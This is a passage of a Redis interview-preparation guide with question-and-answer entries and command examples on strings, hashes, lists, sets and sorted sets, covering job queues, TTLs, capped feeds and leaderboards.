Use a **string** (often JSON) when you read/write the whole object together and rarely touch individual fields — e.g. a rendered page cache, a serialized session you always load in full, an API response cache. One `GET`/`SET`, simplest possible model.

Use a **hash** when the entity has fields you access or update independently:

```bash
# hash: update one field atomically, read a subset
HSET user:123 name alice age 30 email alice@acme.test
HINCRBY user:123 age 1          # atomic single-field update
HMGET user:123 name age         # fetch just what you need
```

The hash wins when you'd otherwise fetch-parse-mutate-rewrite a JSON string for a one-field change (wasteful and racy), or when the object is large but you usually need only a couple of fields. It's also more memory-efficient than many separate `user:123:name`, `user:123:age` string keys, thanks to the compact listpack encoding for small hashes. The next topic covers hashes in depth.

### Q14. Design an atomic distributed ID generator with strings.

Use a single string as a monotonic counter and hand out ranges with `INCR`/`INCRBY`:

```bash
# each call returns a fresh, unique, increasing ID
INCR ids:orders        # -> 1, 2, 3, ... globally unique, atomic
```

Because `INCR` is atomic on the single thread, every caller gets a distinct value with no coordination — no locks, no read-modify-write. To reduce round-trips at high throughput, hand out **blocks** and let each app server allocate locally:

```bash
INCRBY ids:orders 1000    # reserve IDs 1..1000 for this worker, then serve locally
```

Caveats to raise in an interview:

- IDs are dense and sequential — fine internally, but they leak volume/ordering info if exposed publicly (use UUIDs or hashids externally).
- Durability: if the counter lives only in RAM and Redis restarts from a stale snapshot, you could reissue IDs — enable AOF (`appendfsync everysec`/`always`) so the counter survives restarts.
- On Redis Cluster the counter lives in one slot/node; that node's throughput bounds ID generation (usually fine; block-allocation helps).

### Q15. How do TTLs work on strings, and how do you manage expiry?

You attach a TTL either at set-time or afterward:

```bash
SET session:abc token EX 3600     # set with a 1-hour TTL
EXPIRE session:abc 1800           # (re)set TTL to 30 min on an existing key
PEXPIRE session:abc 500           # TTL in milliseconds
TTL session:abc                   # seconds remaining (-1 no TTL, -2 missing)
PERSIST session:abc               # remove the TTL, make it permanent
```

Key behaviors to know:

- **Overwriting clears the TTL** by default — `SET session:abc newtoken` drops the expiry unless you add `KEEPTTL`. This surprises people and can turn a session cache into a permanent leak.
- Redis expires keys via a mix of **lazy** (checked on access) and **active** (background sampling) deletion, so an expired key uses memory until one of those fires.
- TTLs are the backbone of caching (auto-eviction of stale entries), sessions (auto-logout), and fixed-window rate limiting (`INCR` + `EXPIRE`).

Expiry (per-key TTL) is distinct from eviction (memory-pressure removal under `maxmemory`) — a distinction the expiration/eviction topic develops.

### Q16. How does APPEND build a value, and what's the catch?

`APPEND key value` appends bytes to the end of a string (creating it if absent) and returns the new length. It's handy for accumulating data incrementally:

```bash
APPEND log:2026-07-01 "07:00 request received\n"   # -> 24
APPEND log:2026-07-01 "07:01 processed\n"          # -> 40
STRLEN log:2026-07-01                               # total length so far
```

It's an O(1)-amortized operation (Redis over-allocates capacity so repeated appends don't reallocate every time), so building a value with many small appends is efficient CPU-wise.

The catch is **unbounded growth into a big key**. A log string that only ever grows will eventually become multi-megabyte — a big-key latency risk (every operation on it, and every RDB/replication pass, handles the whole thing), and it can approach the 512MB ceiling. If you're appending log-like or event data, a **list** (`LPUSH` + `LTRIM` to cap length) or a **stream** is almost always the better structure — bounded, with per-entry access. Reserve `APPEND` for genuinely small, bounded strings.

## Hashes & Lists

### Summary

**What this topic covers**

Two workhorse structures: the **hash** (a map of field→value stored under one key — the natural way to model an object or record) and the **list** (an ordered sequence of strings with fast ends — the natural way to build stacks, queues, feeds, and simple job pipelines). The 16 questions cover the hash commands (`HSET`/`HGET`/`HMGET`/`HGETALL`/`HINCRBY`/`HRANDFIELD`…), when a hash beats many string keys or a JSON blob, per-field TTLs (`HEXPIRE`, Redis 7.4), and the list commands (`LPUSH`/`RPUSH`/`LPOP`/`RPOP`/`LRANGE`/`LTRIM`/`LREM`). It covers using a list as a **stack (LIFO)** or **queue (FIFO)**, capping a list with `LTRIM` for a bounded feed, **blocking pops** (`BLPOP`/`BRPOP`/`BLMOVE`) for poll-free producer-consumer work queues, the **reliable-queue** pattern with `LMOVE`/`RPOPLPUSH`, and the O(N) middle-access cost that makes lists great at the ends and poor in the middle — plus where lists stop and Streams begin.

**Mental model**

A **hash** is "one key that is itself a small dictionary." Instead of `user:123:name`, `user:123:age` as three separate keys, you have one key `user:123` whose fields are `name`, `age`, `email`. This groups related data, cuts key overhead, and lets you update one field atomically (`HINCRBY user:123 age 1`) without touching the rest. A **list** is a linked sequence optimized at its **two ends**: pushing and popping at the head or tail is O(1), but reaching into the middle is O(N). So think of lists as *pipes and stacks*, not as random-access arrays. The moment you want "the newest N items," you `LPUSH` new items and `LTRIM` to N. The moment you want a work queue, one process `LPUSH`es jobs and another `BRPOP`s them — the pop *blocks* until a job exists, so there's no busy-polling. When you outgrow "fire and forget" (you need acks, replay, consumer groups), you graduate from lists to Streams.

**Key terms**

- **Hash** — a single key holding a map of field→value; ideal for objects/records.
- **`HSET` / `HGET` / `HMGET` / `HGETALL`** — set fields, get one/many/all fields.
- **`HINCRBY`** — atomically increment a numeric field in place.
- **`HRANDFIELD`** — return random field(s), optionally with values.
- **`HEXPIRE`** — per-field TTL on a hash (Redis 7.4+).
- **List** — an ordered sequence of strings, O(1) at the ends.
- **`LPUSH` / `RPUSH` / `LPOP` / `RPOP`** — push/pop at head (L) or tail (R).
- **LIFO / FIFO** — a list as a stack (push+pop same end) or queue (push one end, pop the other).
- **`LTRIM`** — trim a list to a range; the capped-list idiom.
- **`BLPOP` / `BRPOP` / `BLMOVE`** — blocking pops; wait for an element instead of polling.
- **`LMOVE` / `RPOPLPUSH`** — atomically move an element between lists (reliable-queue pattern).

**Why interviewers ask this**

Hashes and lists are where "I can model real problems in Redis" gets tested. For hashes, the signal is knowing *when* to use one — recognizing that many `entity:id:field` string keys, or a re-serialized JSON blob per field change, are both worse than a hash for object data, and that small hashes are memory-cheap. For lists, the signals are: building a work queue with `BRPOP` instead of a polling loop (no wasted round-trips, low latency), knowing the reliable-queue `LMOVE` trick so a crashed worker doesn't lose a job, and knowing the *limits* — that a list is a poor message bus versus Streams because it has no consumer groups, acks, or replay, and that `LINDEX` deep in a big list is O(N). Interviewers use these to separate people who reach for the right structure from people who bolt everything onto strings.

**Common confusions**

- "A hash and a JSON string are interchangeable" — the hash gives atomic field updates and partial reads; the JSON string forces whole-object rewrites.
- "Lists are arrays, so indexing is fast" — random access (`LINDEX`, `LSET`) in the middle is O(N); only the ends are O(1).
- "`BRPOP` polls the server" — no, it blocks server-side and returns the instant an item arrives (or on timeout).
- "A Redis list is a proper message queue" — it lacks consumer groups, acks, and replay; a plain `RPOP` loses the job if the worker crashes mid-processing. Use `LMOVE` (reliable queue) or Streams.
- "Hash fields can't expire individually" — since Redis 7.4 they can, via `HEXPIRE`.
- "`HGETALL` is always fine" — on a hash with huge numbers of fields it's an O(N) big-key hazard.

**What follows from this topic**

Hashes and lists set up the rest of the type tour. The "hash vs separate keys" memory argument previews the encodings/memory-optimization topic (listpack vs hashtable). Lists-as-queues previews the deeper queue and pub/sub topics, and the reliable-queue pattern is the stepping stone to **Streams** with consumer groups (durable, ack'd, replayable messaging) — the honest upgrade path when lists run out of guarantees. Blocking commands (`BLPOP`) preview how Redis supports event-driven consumers. And the O(N)-on-big-keys refrain recurs everywhere latency is discussed.

### Q1. What is a Redis hash and when should you use one?

A **hash** is a single Redis key whose value is a map of **field → value** pairs — the natural representation of an object or record. Instead of scattering an entity across many keys, you keep it in one:

```bash
HSET user:123 name alice age 30 email alice@acme.test
HGET user:123 name            # -> "alice"
HGETALL user:123              # all fields and values
```

Use a hash when you have an entity with **multiple named attributes you access or update independently** — a user profile, a product record, a config object, a shopping-cart line. The wins over alternatives:

- vs **many string keys** (`user:123:name`, `user:123:age`): one key instead of N (less key overhead, less memory, easier to delete/expire the whole entity, atomic multi-field reads).
- vs a **JSON string**: you can read a subset (`HMGET`) and update one field atomically (`HINCRBY`) without fetching and rewriting the whole document.

Small hashes also use a very compact internal encoding (listpack), so they're memory-cheap.

### Q2. Walk through the essential hash commands.

```bash
HSET user:123 name alice age 30    # set one or more fields
HGET user:123 name                 # -> "alice"
HMGET user:123 name age            # -> ["alice","30"], fetch a subset
HGETALL user:123                   # all field/value pairs
HDEL user:123 email                # delete a field
HEXISTS user:123 age               # -> 1 / 0
HINCRBY user:123 age 1             # atomic +1 on a numeric field -> 31
HINCRBYFLOAT user:123 balance 9.99 # atomic float increment
HKEYS user:123                     # all field names
HVALS user:123                     # all values
HLEN user:123                      # number of fields
HRANDFIELD user:123 2 WITHVALUES   # 2 random fields with their values
```

The standouts for interviews: **`HINCRBY`** gives you atomic per-field counters (view counts, inventory, scores) without touching other fields; **`HMGET`** fetches exactly the fields you need in one round-trip; and **`HGETALL`** is convenient but O(N) in field count — a hazard on very wide hashes.

### Q3. Hash vs serialized-JSON string vs separate keys — how do you choose?

| Approach | Field update | Partial read | Memory | Best for |
|---|---|---|---|---|
| **Hash** | Atomic, single field (`HINCRBY`) | Yes (`HMGET`) | Compact (listpack) for small hashes | Objects with independently-updated fields |
| **JSON string** | Rewrite whole blob (racy) | No — fetch+parse all | One value, but re-sent in full | Whole-object caching, read-mostly |
| **Separate keys** | Atomic per key | Multi-key `MGET` | High key overhead | Fields with different TTLs/access patterns |

Decision guide:

- Frequently update individual fields, or need atomic per-field increments → **hash**.
- Always read/write the whole object and rarely mutate fields → **JSON string** (simplest).
- Fields genuinely need different lifetimes or you want per-field TTLs → historically **separate keys**, though Redis 7.4's `HEXPIRE` now lets a hash do per-field TTLs too.

For most "represent an entity" cases, the hash is the default answer.

### Q4. Can hash fields have their own TTLs?

Yes, since **Redis 7.4**, via the `HEXPIRE` family — before that, TTLs were only per-key, so field-level expiry meant using separate string keys.

```bash
HSET session:abc token xyz csrf abc123
HEXPIRE session:abc 3600 FIELDS 1 token   # expire just the 'token' field in 1h
HTTL session:abc FIELDS 1 token           # -> seconds remaining for that field
HPERSIST session:abc FIELDS 1 token       # remove the field's TTL
```

You specify which fields via the `FIELDS <count> <field...>` syntax. Related commands: `HPEXPIRE` (millis), `HEXPIREAT`/`HPEXPIREAT` (absolute), `HTTL`/`HPTTL`, `HPERSIST`.

This is genuinely useful — e.g. a session hash where the auth token expires sooner than the rest of the profile, or a rate-limit hash where individual sub-counters age out — without splitting the entity across keys. It's a recent enough feature that mentioning it (and noting it needs Redis 7.4+) is a nice senior signal.

### Q5. What is a Redis list and what are its performance characteristics?

A **list** is an ordered collection of strings, implemented so that **operations at the two ends are O(1)** and operations in the middle are O(N). Internally it's a quicklist (a linked list of listpack nodes), which is why head/tail access is cheap but positional access isn't.

```bash
LPUSH feed a         # push to head (left)  -> [a]
RPUSH feed b         # push to tail (right) -> [a, b]
LPOP feed            # pop from head        -> "a"
RPOP feed            # pop from tail        -> "b"
LLEN feed            # length
LRANGE feed 0 -1     # all elements (O(N))
LINDEX feed 5        # element at index 5   (O(N) into the middle)
```

The mental model: a list is great as a **pipe or stack** (push/pop at ends) and poor as a random-access array. Design your usage around the ends — newest-first feeds, FIFO/LIFO queues, capped logs — and avoid deep `LINDEX`/`LSET`/`LINSERT` on large lists, which walk the structure.

### Q6. How do you use a list as a stack versus a queue?

Same structure, different end-discipline:

**Stack (LIFO)** — push and pop at the *same* end:

```bash
LPUSH stack a
LPUSH stack b
LPOP stack        # -> "b" (last in, first out)
```

**Queue (FIFO)** — push at one end, pop at the other:

```bash
LPUSH queue job1     # producer pushes left
LPUSH queue job2
RPOP queue           # -> "job1" (first in, first out)
```

So `LPUSH` + `LPOP` = stack; `LPUSH` + `RPOP` (or `RPUSH` + `LPOP`) = queue. Both are O(1) because they only touch the ends. This is the basis of Redis's most common queue idiom: producers `LPUSH` work onto the head, workers `RPOP` (or better, `BRPOP`) from the tail, giving FIFO job processing with no extra machinery.

### Q7. How do you keep only the latest N items with LTRIM?

`LTRIM key start stop` retains only the elements in a given index range and discards the rest — the **capped-list** idiom. Combine it with `LPUSH` to keep a bounded, newest-first collection:

```bash
LPUSH activity:user:123 "logged in"      # newest goes to the head
LTRIM activity:user:123 0 99             # keep only the newest 100 items
```

Every insert pushes to the head and trims the tail back to N, so the list never grows unbounded. This is the standard pattern for:

- Recent-activity feeds ("last 100 actions").
- Latest-N log lines or events.
- A user's recently-viewed items.

`LTRIM` at a fixed size is O(N) only in the number of elements removed (usually just the overflow), so `LPUSH`+`LTRIM 0 N-1` is cheap in steady state. It's the go-to way to bound memory for feed-like data — far better than an ever-growing list or an `APPEND`ed string.

### Q8. What are blocking pops (BLPOP/BRPOP) and why use them?

`BLPOP`/`BRPOP` are the **blocking** versions of `LPOP`/`RPOP`: if the list is empty, the client *waits* (server-side) until an element is pushed or a timeout elapses, instead of returning nil immediately.

```bash
# worker: block up to 5s waiting for a job on the tail
BRPOP jobs 5
# -> ["jobs", "job1"]   when an item arrives
# -> (nil)              after 5s if none

BRPOP jobs 0    # 0 = block forever until an item arrives
```

Why this matters: without blocking pops, a worker must **poll** — `RPOP` in a loop with a `sleep` — which either wastes CPU/round-trips (tight loop) or adds latency (long sleep). `BRPOP` gives you the best of both: **zero polling, near-zero latency** — the worker sleeps until the instant a job is pushed. It's the idiomatic way to build a producer-consumer work queue in Redis. `BLMOVE` (below) is the blocking form of the reliable-queue move.

### Q9. Design a simple job queue with Redis lists.

Producers push jobs onto the head; workers block-pop from the tail (FIFO):

```bash
# producer
LPUSH jobs '{"id":1,"task":"resize-image","key":"img:42"}'

# worker loop (pseudocode)
while true:
    job = BRPOP jobs 0      # block until a job arrives, then FIFO-dequeue
    process(job)
```

Properties:

- **FIFO** ordering (push left, pop right).
- **No polling** — `BRPOP` wakes the worker exactly when work exists.
- **Horizontal scaling** — run many workers all `BRPOP`-ing the same key; Redis hands each job to exactly one worker atomically.

The gap to call out: this is **at-most-once with a loss window**. If a worker `BRPOP`s a job and then crashes before finishing, the job is gone — it's no longer in the list and there's no ack. For at-least-once processing you need the reliable-queue pattern (`LMOVE` to a processing list) or, better, Streams with consumer groups. Mentioning that limitation unprompted is the senior move.

### Q10. What is the reliable-queue pattern with LMOVE/RPOPLPUSH?

The plain `BRPOP` queue loses a job if the worker dies mid-processing. The **reliable-queue** pattern fixes this by atomically *moving* the job to a per-worker "processing" list instead of just popping it:

```bash
# atomically pop from the tail of 'jobs' and push to head of 'processing'
LMOVE jobs processing RIGHT LEFT
# (older equivalent: RPOPLPUSH jobs processing)
# blocking variant:
BLMOVE jobs processing RIGHT LEFT 0
```

Now the job lives in `processing` while the worker handles it. On success, the worker `LREM`s it from `processing` (ack). If the worker **crashes**, the job is still sitting in `processing`, and a reaper can detect stale entries and move them back to `jobs` for retry — so no job is silently lost (at-least-once).

The tradeoff: you must manage the processing list and reaping yourself, and you can get duplicate processing (hence make handlers idempotent). This pattern is the conceptual bridge to **Streams**, which build acknowledgement, pending-entry tracking, and retries into the server via consumer groups.

### Q11. What are the limits of a list as a message queue versus Streams?

A list-based queue is simple and fast but deliberately minimal. Compared to **Streams**:

| Capability | List queue | Stream |
|---|---|---|
| Delivery | Pop = at-most-once (or DIY reliable queue) | Consumer groups with explicit `XACK` |
| Multiple consumer groups | No (a job goes to one popper) | Yes — many groups each read all messages |
| Replay / history | No — popped is gone | Yes — messages persist, re-readable by ID |
| Pending/retry tracking | DIY (processing list + reaper) | Built-in Pending Entries List (`XPENDING`/`XCLAIM`) |
| Message IDs / ordering | Implicit position | Explicit time-ordered IDs |

Use a **list** when you want a lightweight, single-consumer-group FIFO/worker queue and can tolerate (or engineer around) the loss window. Move to a **Stream** when you need durable messages, multiple independent consumer groups, acknowledgements, replay/audit, or fan-out — i.e. Kafka-lite semantics. The honest interview answer: "a list is a great simple queue; the moment I need acks, consumer groups, or replay, I switch to Streams."

### Q12. Why is accessing the middle of a big list slow?

Because a Redis list is a **linked structure (quicklist)**, not a contiguous array. To reach index *i* the server must walk from an end through the nodes — so `LINDEX`, `LSET`, `LINSERT`, and mid-range `LRANGE` are **O(N)** in the distance into the list. On a list with millions of elements, a deep `LINDEX list 500000` traverses ~500k elements *on the single thread*, blocking every other client for the duration.

```bash
LINDEX feed 0        # O(1) — near an end
LINDEX feed -1       # O(1) — the other end
LINDEX feed 500000   # O(N) — walks deep into a big list, latency risk
```

The ends are the exception (O(1)), which is why push/pop and "latest N" via `LRANGE 0 N` stay cheap. Design implication: **use lists for end-oriented access** (queues, stacks, capped feeds), and if you need random access by position or key, use a different structure (a sorted set for ranked access, a hash for keyed access). Treating a big list like an array is a classic latency footgun.

### Q13. Design a recent-activity feed.

Keep a per-user capped list, newest-first, with `LPUSH` + `LTRIM`:

```bash
# on each activity, prepend and cap to the latest 50
LPUSH feed:user:123 '{"t":1719800000,"action":"liked post 42"}'
LTRIM feed:user:123 0 49

# render the feed (newest first) — O(N) but N is bounded at 50
LRANGE feed:user:123 0 -1
```

Why this shape:

- `LPUSH` puts newest at the head (O(1)); `LRANGE 0 -1` reads them newest-first.
- `LTRIM 0 49` bounds memory and keeps reads cheap — the list never grows past 50.
- Optionally set a TTL on the key so inactive users' feeds expire.

Enhancements to mention: store just IDs in the list and hydrate details from hashes to save memory; for a *global* timeline shared by many users, or one needing ranking by score/time with range queries, a **sorted set** (ZSET keyed by timestamp) is often better than a list. But for a simple per-user "last N actions," the capped list is the clean, idiomatic answer.

### Q14. When would you choose a hash over a list, or vice versa?

They model different shapes of data:

Choose a **hash** when you have **keyed attributes of one entity** — you look things up by *name*: a user's `name`/`age`/`email`, a config's settings, a cart keyed by product ID → quantity. Access is by field, updates are per-field and atomic, and order doesn't matter.

Choose a **list** when you have an **ordered sequence** where position/recency matters and you work at the ends: a queue of jobs, a stack, a feed of recent events, a log of the latest N lines. Access is by position (mostly the ends), and insertion order is the whole point.

Quick test: *"Do I look things up by name, or by position/recency?"* By name → hash. By order → list. A shopping cart's *contents* (product → qty) is a hash; a user's *browsing history* (ordered, recent-first) is a list. Picking the structure that matches the access pattern is exactly the judgment interviewers are probing.

### Q15. What are the memory considerations for hashes and lists?

Both types use **compact encodings when small and convert to heavier structures past thresholds** — a key lever for memory efficiency.

- A **small hash** is stored as a **listpack** (a compact, contiguous blob) until it exceeds `hash-max-listpack-entries` (default 128) or `hash-max-listpack-value` (default 64 bytes), after which it becomes a full hashtable — much more per-field overhead. So many small hashes (e.g. `user:123` with a handful of fields) are very memory-cheap; a hash with thousands of fields is not.
- A **list** is a **quicklist** of listpack nodes; small lists pack tightly, and `list-max-listpack-size` controls node sizing.

Practical guidance:

- Prefer **many small hashes** over a few enormous ones — keeping hashes under the listpack thresholds can cut memory dramatically (a classic Redis optimization is bucketing keys into small hashes).
- Watch **big keys**: a hash with millions of fields or a list with millions of elements is both a memory and a latency (O(N) command) hazard.
- Use `OBJECT ENCODING key` to confirm whether a value is still in its compact encoding.

The encodings/memory-optimization topic goes deeper; the instinct to seed now is *small aggregates are cheap, giant ones are not*.

### Q16. Spot the anti-pattern: what's wrong with this queue worker?

```bash
# worker (polling loop)
while true:
    job = RPOP jobs         # returns nil if empty
    if job == nil:
        sleep(1)            # busy-wait
        continue
    process(job)            # if we crash here, the job is lost
```

Two problems:

1. **Polling with `RPOP` + `sleep`.** When the queue is empty this either burns CPU/round-trips (short sleep) or adds up to a second of latency per job (long sleep). Replace it with a **blocking pop**: `BRPOP jobs 0` sleeps server-side and returns the instant a job arrives — no polling, minimal latency.
2. **Lost jobs on crash.** `RPOP` removes the job from Redis *before* it's processed. If the worker dies during `process(job)`, the job is gone — no retry, no ack. Use the **reliable-queue** pattern: `BLMOVE jobs processing RIGHT LEFT 0` atomically moves the job to a processing list; `LREM` it on success, and have a reaper requeue stale entries after a timeout. For full delivery guarantees (acks, consumer groups, replay), use **Streams**.

Fixed version:

```bash
while true:
    job = BLMOVE jobs processing RIGHT LEFT 0   # block + reliable move
    process(job)                                # make idempotent
    LREM processing 1 job                       # ack
```
## Sets & Sorted Sets

### Summary

**What this topic covers**

Two of Redis's most powerful native types: the **set** (an unordered collection of unique strings) and the **sorted set** / **ZSET** (a set where every member carries a floating-point **score** and members stay sorted by that score). This topic — 17 questions — walks from the humble set (`SADD`, `SISMEMBER`, and the server-side **set algebra** of `SINTER`/`SUNION`/`SDIFF` that powers tags, common-friends, permissions, and unique-visitor counting) up to the ZSET, which is arguably the single most-loved data structure in Redis interviews. The ZSET is the engine behind **leaderboards**, **priority queues**, **delayed-job schedulers**, **time-ordered feeds / sliding windows**, and **secondary indexes** — anything where you need "keep things sorted by a number and query ranges cheaply." If you can reach for a ZSET the moment someone says "top N," "nearest in time," or "rank," you sound senior.

**Mental model**

A **set** is a hash table with keys and no values — membership is O(1), and you get union/intersection/difference *computed inside Redis* rather than shipping millions of IDs to the app and looping. That server-side set algebra is the whole point: "which users have BOTH tag A and tag B" is one `SINTER`, not two `SMEMBERS` and a client-side loop. A **sorted set** is the killer combination of a **hash** (member → score, for O(1) score lookups and updates) and a **skip list** (ordered by score, for O(log N) inserts and O(log N + M) range scans). So a ZSET simultaneously answers "what's alice's score?" (hash) and "who are the top 10?" or "everything scored between two timestamps?" (skip list) — both fast. Whenever a problem has the shape *maintain a live ranking / ordering by some number and repeatedly ask for slices of it*, the answer is almost always a ZSET. Score can be points (leaderboard), a timestamp (feed / sliding window / delayed job due-time), or a priority (queue).

**Key terms**

- **set** — unordered collection of unique strings; O(1) add/remove/membership.
- **intset** — compact encoding when a set holds only integers and is small; converts to a hashtable past thresholds.
- **set algebra** — `SINTER`/`SUNION`/`SDIFF` and their `...STORE` variants compute intersection/union/difference server-side.
- **SSCAN** — cursor-based iteration over a set; the safe alternative to `SMEMBERS` on large sets.
- **sorted set / ZSET** — set where each member has a float **score**; kept ordered by score.
- **score** — the float attached to each ZSET member; drives ordering. Ties break lexicographically by member.
- **skip list** — the ordered structure under a ZSET giving O(log N) inserts and O(log N + M) range reads.
- **ZADD flags** — `NX` (add-only), `XX` (update-only), `GT`/`LT` (only if greater/less), `CH` (return changed count), `INCR` (act like `ZINCRBY`).
- **rank** — a member's 0-based position in score order; `ZRANK` (ascending), `ZREVRANK` (descending).
- **lexicographic range** — `ZRANGEBYLEX` on members that all share the same score, for autocomplete/prefix queries.
- **ZRANGEBYSCORE** — pull all members whose score falls in a range; the workhorse for time-windows and schedulers.
- **listpack encoding** — small ZSETs are stored compactly; large ones become skiplist+hashtable.

**Why interviewers ask this**

The set/ZSET question is where interviewers separate people who use Redis as "just a cache" from people who use it as a data-structure server. A junior reaches for a set only to dedupe. A senior sees "leaderboard," "recent activity feed," "rate limiter," "nearest-in-time job," or "who has permission X" and immediately maps each to a ZSET or a set operation, then talks about the O-cost and memory. The ZSET is the canonical "design X with Redis" prompt precisely because so many real problems fold onto it. Getting the encoding, the O(log N) cost model, and the `ZRANGEBYSCORE`-with-`LIMIT` pattern right signals someone who has actually run these at scale — and who knows the footguns (`SMEMBERS`/`ZRANGE 0 -1` on a huge key blocking the single thread).

**Common confusions**

- "A set keeps insertion order" — it does **not**. Sets are unordered; if you need order, use a list or a ZSET.
- "`SMEMBERS`/`ZRANGE key 0 -1` is fine" — both are **O(N)** and dump the whole key; on a big key that blocks the single-threaded server. Use `SSCAN`/`ZSCAN` or bounded ranges.
- "ZSET scores are integers" — they're **double-precision floats**; beyond 2^53 you lose integer precision, which matters for millisecond-timestamp scores far in the future (rare, but real).
- "`ZRANGEBYLEX` sorts by member alphabetically in general" — only meaningful when **all members share the same score**; otherwise ordering is by score first.
- "A ZSET and a set with a score field are the same" — no; the ZSET maintains the *sorted structure* for you in O(log N), which a plain set can't.

**What follows from this topic**

The ZSET reappears everywhere: the **sliding-window rate limiter** (score = timestamp) is built here and revisited under rate limiting; **Geo** commands (next topic) are literally a ZSET with geohash scores; **Streams** offer an alternative for durable, time-ordered logs. Set algebra connects to secondary indexing and to the caching topics (tag-based cache invalidation). Master the ZSET and a large fraction of "design this feature in Redis" questions collapse to a few commands.

### Q1. What is a Redis set and what operations does it support?

A **set** is an unordered collection of **unique** strings — think of a math set, or a hash table with keys and no values. Adds, removes, and membership tests are all O(1) average.

```bash
SADD tags:post:1 redis nosql cache     # add members (dupes ignored)
SISMEMBER tags:post:1 redis            # -> 1 (present)
SMISMEMBER tags:post:1 redis mongo     # -> 1 0 (batch check, Redis 6.2+)
SCARD tags:post:1                      # -> 3 (cardinality)
SREM tags:post:1 cache                 # remove
SRANDMEMBER tags:post:1 2              # random members without removing
SPOP tags:post:1                       # remove and return a random member
```

Use a set whenever you need dedup + fast "is X in here?" — tags, followers, seen-IDs, feature flags, a permission set. `SRANDMEMBER` is handy for random sampling; `SPOP` for a random-draw queue (raffle, work stealing).

### Q2. What is Redis set algebra and why is it powerful?

Redis computes **intersection**, **union**, and **difference** *inside the server*, so you never ship membership lists to the client to combine them.

```bash
SINTER online:users premium:users        # users who are online AND premium
SUNION tag:a tag:b                        # posts with tag a OR b
SDIFF all:users banned:users              # everyone except banned
SINTERSTORE result online:users premium:users   # store the result in a key
```

The `...STORE` variants persist the result as a new set (great for caching an expensive intersection). Canonical uses: **common friends** (`SINTER friends:alice friends:bob`), **unique visitors** (add visitor IDs to a per-day set, `SCARD` for the count, `SUNIONSTORE` to roll days up), **tag search**, and **permission checks** (does the user's role set intersect the required-permissions set?). This is far faster and less network-heavy than pulling both sets to the app and looping.

Caveat: `SINTER`/`SUNION` on very large sets is O(N) work on the single thread — for huge sets prefer `SINTERSTORE` off-peak, or reconsider the data model.

### Q3. Why is `SMEMBERS` dangerous on a large set, and what should you use instead?

`SMEMBERS` returns **every** member in one shot — O(N) time and it materialises the whole reply. Because Redis executes commands on a **single thread**, a `SMEMBERS` on a set with millions of members **blocks every other client** for the duration, spiking p99 latency across the board. Same footgun as `KEYS *`.

Use **`SSCAN`** — a cursor-based iterator that returns members in small batches and never blocks for long:

```bash
SSCAN myset 0 COUNT 100     # returns a cursor + ~100 members
SSCAN myset <cursor> COUNT 100   # repeat until cursor returns 0
```

`SSCAN` gives no ordering and may return a member more than once across iterations (you dedupe client-side), but it keeps the server responsive. Rule: never `SMEMBERS`/`ZRANGE key 0 -1`/`HGETALL` on a key you can't bound the size of.

### Q4. How are sets encoded internally, and why does it matter?

Redis picks the encoding based on contents and size:

- **intset** — a sorted integer array, used when the set holds **only integers** and stays under `set-max-intset-entries` (default 512). Extremely compact and cache-friendly.
- **listpack** — a compact encoding for small sets of non-integers (Redis 7.2+), under `set-max-listpack-entries`.
- **hashtable** — the general case; O(1) ops but higher per-member overhead.

It matters for **memory**: a set of a few hundred integer IDs as an intset costs a fraction of the same set as a hashtable. Crossing a threshold triggers a one-way conversion to hashtable — you don't convert back. So a set of small integers is a genuinely cheap way to store, say, "which of these 500 feature IDs are enabled."

### Q5. What is a sorted set (ZSET) and how does it differ from a set?

A **sorted set** is a set where every member additionally carries a **floating-point score**, and Redis keeps members **ordered by score** at all times. So you get set semantics (unique members) *plus* a live ordering you can range-query cheaply.

```bash
ZADD leaderboard 100 alice 250 bob 175 carol
ZSCORE leaderboard bob          # -> 250  (O(1) score lookup)
ZREVRANGE leaderboard 0 2 WITHSCORES   # top 3: bob 250, carol 175, alice 100
ZRANK leaderboard alice         # -> 0 (lowest score, ascending rank)
ZREVRANK leaderboard alice      # -> 2 (rank from the top)
```

Difference from a plain set: a set answers only "is X a member?" A ZSET also answers "what's X's score?", "what's X's rank?", "who's in the top/bottom N?", and "who scored between A and B?" — all efficiently. Internally it's a **hash** (member→score, O(1)) combined with a **skip list** (ordered, O(log N) insert, O(log N + M) range read). That dual structure is why ZSETs are so versatile.

### Q6. What are the main ZSET commands you should know?

```bash
ZADD key [NX|XX] [GT|LT] [CH] [INCR] score member   # add/update
ZINCRBY key 10 alice          # bump alice's score by 10
ZSCORE key alice              # one member's score
ZRANK / ZREVRANK key alice    # 0-based rank asc / desc
ZCARD key                     # number of members
ZCOUNT key 100 200            # members with score in [100,200]
ZRANGE key 0 9 [REV] [WITHSCORES]         # by rank
ZRANGEBYSCORE key 100 200 [LIMIT off cnt] # by score range
ZRANGEBYLEX key "[a" "[c"     # by member (same-score sets)
ZPOPMIN / ZPOPMAX key         # pop lowest/highest-scored member
ZREMRANGEBYSCORE key 0 1000   # trim a score range (sliding windows)
ZREMRANGEBYRANK key 0 -101    # keep only top 100
```

Note: modern Redis folds `ZREVRANGE`/`ZRANGEBYSCORE`/`ZRANGEBYLEX` into `ZRANGE` with `REV`/`BYSCORE`/`BYLEX` options, but the classic command names still work and are what most interviewers say.

### Q7. Explain the `ZADD` flags: NX, XX, GT, LT, CH, INCR.

These control *when* and *how* `ZADD` mutates:

- **NX** — only add **new** members; never update an existing member's score. Good for "set once."
- **XX** — only update members that **already exist**; never add new ones.
- **GT** / **LT** — only update if the new score is **greater** / **less** than the current score. `GT` is perfect for a high-score leaderboard where you only want to raise a player's best.
- **CH** — return the count of members **changed** (added *or* updated), not just added.
- **INCR** — behave like `ZINCRBY`: increment the member's score by the given amount and return the new score (only one member allowed).

```bash
ZADD highscores GT CH 500 alice   # raise alice's best only if 500 beats it
ZADD counter INCR 1 page:home     # atomic increment of a scored counter
```

`GT`/`LT` are newer (Redis 6.2+) and neatly avoid a read-modify-write round trip for "keep the best/worst score."

### Q8. Design a leaderboard with Redis.

A leaderboard is the textbook ZSET use case — score = points, member = player.

```bash
ZADD leaderboard 1500 alice           # or: ZINCRBY leaderboard 50 alice
ZREVRANGE leaderboard 0 9 WITHSCORES  # top 10
ZREVRANK leaderboard alice            # alice's 0-based rank (add 1 to display)
ZSCORE leaderboard alice              # alice's points
ZCARD leaderboard                     # total players
```

**Player's neighbours** ("show me and the two players around me"): get rank with `ZREVRANK`, then `ZREVRANGE leaderboard rank-1 rank+1 WITHSCORES`.

**Time-boxed boards** (daily/weekly): key by period — `leaderboard:2026-07`, set a TTL, and let it expire. To merge periods use `ZUNIONSTORE`.

